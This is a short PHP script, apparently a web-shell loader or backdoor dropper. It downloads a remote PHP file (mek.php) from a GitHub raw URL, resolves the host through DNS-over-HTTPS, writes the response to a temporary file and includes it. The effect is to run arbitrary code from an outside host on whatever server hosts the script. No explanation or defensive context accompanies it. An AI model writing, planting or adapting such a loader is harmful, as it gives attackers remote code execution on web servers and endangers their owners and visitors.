<?php
$url = 'https://raw.githubusercontent.com/Jenderal92/KC5/refs/heads/master/mek.php';
$dns = 'https://cloudflare-dns.com/dns-query';

$ch = curl_init($url);
if (defined('CURLOPT_DOH_URL')) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$res = curl_exec($ch);
curl_close($ch);

$tmp = tmpfile();
$path = stream_get_meta_data($tmp)['uri'];

fprintf($tmp, '%s', $res);
include($path);
?>
